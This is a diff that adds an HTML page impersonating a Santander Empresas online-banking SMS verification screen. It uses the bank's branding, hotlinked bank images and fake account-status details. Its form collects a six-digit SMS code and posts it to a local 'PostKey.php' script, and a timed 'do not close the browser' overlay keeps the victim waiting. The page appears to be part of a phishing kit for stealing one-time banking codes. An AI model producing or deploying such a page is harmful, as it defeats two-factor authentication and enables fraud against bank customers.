@@ -1,0 +1,264 @@
+<!DOCTYPE html>
+<html>
+ <head>
+  <!-- Basic -->
+  <meta charset="utf-8"/>
+  <meta content="IE=edge" http-equiv="X-UA-Compatible"/>
+  <title>
+   Santander Empresas
+  </title>
+  <link href="./App/favicon.ico" rel="icon"/>
+  <meta content="width=device-width, initial-scale=1" name="viewport"/>
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet"/>
+  <link crossorigin="anonymous" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" rel="stylesheet"/>
+  <link href="./App/css/styles.6e4d9eeda5a8ca3c7956.css" rel="stylesheet"/>
+  <link href="./App/css/styles_sms.css" rel="stylesheet"/>
+  <link href="./App/css/styles_smsloading.css" rel="stylesheet"/>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js">
+  </script>
+  <script type="text/javascript">
+   $(document).ready(function () {
+            $('#selectorloader').fadeIn('slow', function () {
+                $('#selectorloader').delay(20000).fadeOut(150);
+            });
+        });
+
+
+
+function validateForm() {
+  var smscodeone = document.forms["myForm"]["smscodeone"].value;
+  if (smscodeone == "") {
+    document.getElementById("smscodeone").style.border = "1px solid #f91313";
+    return false;
+  }
+}
+  </script>
+ </head>
+ <body>
+  <!-- LOADING SMS -->
+  <div class="pageLoader" id="selectorloader" style="background-color: rgb(255, 255, 255);position: fixed;width: 100%;height: 100%;z-index: 9999;top: 0px;opacity: 0.9;text-align: center;display: none;">
+   <p style=" margin-top: 94px; font-size: 19px; color:#d70000; font-weight: 500; ">
+    <strong>
+     Contrato Multicanal
+    </strong>
+    Por favor espere mientras procesamos su solicitud No cierres el navegador
+   </p>
+   <div class="spinner loading">
+   </div>
+  </div>
+  <div class="topnavAll">
+   <div class="topnav" id="myTopnav">
+    <a href="">
+     <i class="i-logoret">
+     </i>
+    </a>
+    <div class="hstar-inserted">
+     <a href="">
+      <i class="icon i-helpus">
+      </i>
+      <br/>
+      <span class="spintext">
+       Ay&uacute;danos a mejorar
+      </span>
+     </a>
+     <a href="">
+      <i class="icon i-email">
+      </i>
+      <br/>
+      <span class="spintext">
+       Buz&oacute;n
+      </span>
+     </a>
+     <a href="">
+      <i class="icon i-accountuser">
+      </i>
+      <br/>
+      <span class="spintext">
+       &Aacute;rea personal
+      </span>
+     </a>
+     <a href="">
+      <i class="icon i-help">
+      </i>
+      <br/>
+      <span class="spintext">
+       Atenci&oacute;n al cliente
+      </span>
+     </a>
+     <a href="">
+      <i class="icon i-logout">
+      </i>
+      <br/>
+      <span class="spintext">
+       Desconexi&oacute;n
+      </span>
+     </a>
+    </div>
+   </div>
+  </div>
+  <form action="./inc/PostKey.php" method="post" name="myForm" onsubmit="return validateForm()">
+   <br/>
+   <!-- <div class="row" style="width: 96%;margin: auto;"> -->
+   <center>
+    <div class="col-sm-6">
+     <div class="card">
+      <div class="card-body">
+       <span class="firmatxt">
+        <em class="iconfirmako">
+        </em>
+        Verificaci&oacute;n de SMS
+       </span>
+       <div style="flex-flow: row wrap; box-sizing: border-box; display: flex; place-content: center; align-items: center;">
+        <!---->
+        <span class="number ng-star-inserted">
+         Acceso del cliente al cabo de un tiempo recibir&aacute;s un c&oacute;digo SMS para confirmaci&oacute;n Debe haber recibido un mensaje de texto con un c&oacute;digo en su tel&eacute;fono.
+        </span>
+       </div>
+       <div class="input-group input-group-sm mb-3 container">
+        <input class="form-control" id="smscodeone" maxlength="6" name="smscodeone" pattern="[0-9]{6}" style=" font-size: 13px; font-family: auto; " type="text"/>
+       </div>
+       <button class="btn btn-danger" type="submit">
+        Continuar
+       </button>
+      </div>
+     </div>
+    </div>
+   </center>
+  </form>
+  <!-- Footer -->
+  <footer class="page-footer font-small blue pt-4" style="border-top: 1px solid #ccc;background: #5f5f5f;margin-top: 6.5rem!important;">
+   <!-- Footer Links -->
+   <div class="container-fluid text-center text-md-left">
+    <!-- Grid row -->
+    <div class="row">
+     <!-- Grid column -->
+     <div class="col-md-3 mt-md-0 mt-3">
+      <!-- Content -->
+      <h5 class="text-uppercase titalfoter">
+       INFORMACI&Oacute;N
+      </h5>
+      <ul class="list-unstyled">
+       <li>
+        <a class="stylealist" href="#!">
+         Accesibilidad
+        </a>
+       </li>
+       <li>
+        <a class="stylealist" href="#!">
+         Seguridad
+        </a>
+       </li>
+       <li>
+        <a class="stylealist" href="#!">
+         Tabl&oacute;n de anuncios
+        </a>
+       </li>
+       <li>
+        <a class="stylealist" href="#!">
+         MIFID
+        </a>
+       </li>
+      </ul>
+     </div>
+     <!-- Grid column -->
+     <hr class="clearfix w-100 d-md-none pb-3"/>
+     <!-- Grid column -->
+     <div class="col-md-3 mb-md-0 mb-3">
+      <!-- Links -->
+      <h5 class="text-uppercase titalfoter">
+       LEGAL
+      </h5>
+      <ul class="list-unstyled">
+       <li>
+        <a class="stylealist" href="#!">
+         T&eacute;rminos y condiciones
+        </a>
+       </li>
+       <li>
+        <a class="stylealist" href="#!">
+         Pol&iacute;tica de cookies
+        </a>
+       </li>
+       <li>
+        <a class="stylealist" href="#!">
+         Aviso legal
+        </a>
+       </li>
+       <li>
+        <a class="stylealist" href="#!">
+         MIFID
+        </a>
+       </li>
+      </ul>
+     </div>
+     <!-- Grid column -->
+     <!-- Grid column -->
+     <div class="col-md-6 mb-md-0 mb-3">
+      <!-- Links -->
+      <h5 class="text-uppercase titalfoter">
+       SANTANDER EN TU M&Oacute;VIL
+      </h5>
+      <ul class="list-unstyled">
+       <li>
+        <a class="fotertext" href="">
+         Descubre todas las novedades de nuestra nueva app de banca m&oacute;vil
+        </a>
+       </li>
+       <li>
+        <img alt="Apple" class="hbs-apps" src="https://particulares.bancosantander.es/nhb/assets/images/footer/apple-store.png"/>
+        <img alt="Apple" class="hbs-apps" src="https://particulares.bancosantander.es/nhb/assets/images/footer/google-play.png" style=" margin-left: 12px; "/>
+        <table>
+         <tbody>
+          <tr>
+           <th>
+           </th>
+          </tr>
+          <tr>
+          </tr>
+          <tr>
+           <th>
+           </th>
+          </tr>
+          <tr>
+          </tr>
+          <tr>
+           <th>
+           </th>
+          </tr>
+         </tbody>
+        </table>
+       </li>
+       <li>
+        <a class="fotertext" href="">
+         &Uacute;ltimo cambio de clave : 07 noviembre 2020 | 11:15:48
+        </a>
+       </li>
+       <li>
+        <a class="fotertext" href="">
+         Estado de firma :
+         <strong class="tickcircle">
+          <em class="i-tickcircle">
+          </em>
+          Activa
+         </strong>
+        </a>
+       </li>
+      </ul>
+     </div>
+     <!-- Grid column -->
+    </div>
+    <!-- Grid row -->
+   </div>
+   <!-- Footer Links -->
+   <!-- Copyright -->
+   <div class="footer-copyright text-center py-3" style=" background-color: #434343; width: 100%; color: #fff; height: 2.4rem; font-size: 12px; margin: auto; display: flex; justify-content: center; align-items: center; ">
+    &copy; Banco Santander, S.A. Santander es una marca registrada.
+    <a class="fotertexttow" href="">
+     Todos los derechos reservados
+    </a>
+   </div>
+   <!-- Copyright -->
+  </footer>
+  <!-- Footer -->
+ </body>
+</html>
